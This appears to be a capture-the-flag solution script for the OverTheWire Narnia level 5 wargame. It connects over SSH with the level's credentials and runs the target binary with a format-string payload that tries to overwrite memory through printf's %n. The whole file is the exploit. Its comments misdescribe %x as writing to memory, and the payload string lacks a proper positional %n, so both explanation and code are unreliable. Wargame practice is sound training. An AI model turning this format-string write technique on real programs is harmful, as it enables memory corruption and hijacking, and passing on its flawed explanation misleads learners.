from pwn import * 
#the %n reads the value stored in the current buffer pointer and write to that memory location the number of characters already printed
#This %x makes the printf write a number at the address specified at the beginning
#we use $ when we need to write or print at specified offset
user = 'narnia5'
passwd = 'faimahchiy'

s = ssh(host= 'narnia.labs.overthewire.org', user=user, password=passwd, port=2226)

s.set_working_directory('/narnia')

payload = ""
payload += p32(0xffffd5f0)
payload += "%496x"
payload += "$n"

p = s.process(['./narnia5',payload])
p.interactive()